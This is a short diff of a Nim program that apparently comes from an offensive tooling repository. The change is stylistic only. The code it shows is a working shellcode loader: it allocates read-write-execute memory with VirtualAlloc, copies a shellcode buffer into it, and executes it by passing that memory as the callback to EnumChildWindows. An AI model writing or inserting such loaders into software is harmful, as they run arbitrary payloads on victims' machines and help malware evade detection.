@@ -5,14 +5,10 @@ import winim/lean
 
 proc enumChildWindows[byte](shellcode: openArray[byte]): void =
   
-  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
 
-  EnumChildWindows(
-    cast[HWND](nil),
-    cast[WNDENUMPROC](rPtr),
-    cast[LPARAM](nil)
-  )
+  EnumChildWindows(cast[HWND](NULL), cast[WNDENUMPROC](rPtr), cast[LPARAM](NULL))
 
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
